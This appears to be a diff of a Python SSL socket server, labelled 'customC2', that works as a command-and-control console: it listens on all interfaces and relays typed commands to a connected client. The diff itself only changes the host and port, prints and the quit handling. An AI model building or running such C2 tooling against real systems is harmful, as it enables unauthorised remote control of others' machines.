@@ -5,9 +5,12 @@
 import socket
 import ssl
 
+HOST = '0.0.0.0'
+PORT = 25566
+
 # Créer une socket TCP/IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('localhost', 1234))
+sock.bind((HOST, PORT))
 sock.listen(1)
 
 # Envelopper la socket dans un contexte SSL
@@ -16,7 +19,7 @@ context.load_cert_chain(certfile="./chiffrement/python_ssl.pem",
                         keyfile="./chiffrement/python_ssl_priv.key")
 
 while True:
-    print("En attente de connexion...")
+    print(f"[*] Listening to {HOST}:{PORT}")
     conn, addr = sock.accept()
 
     # Envelopper la connexion entrante dans un contexte SSL
@@ -24,10 +27,12 @@ while True:
     print(connssl.version())
 
     try:
-        print("Connecté par", addr)
+        print(f"[+] Client connected : {addr}")
         while True:
-            command = input("(customC2) ")
+            command = input("(customC2) $ ")
             if command == "q" or command == "quit" or command == "exit":
+                connssl.sendall(command.encode())
+                reply = connssl.recv(1024)
                 print('quitting console')
                 sock.shutdown(socket.SHUT_RDWR)
                 sock.close()
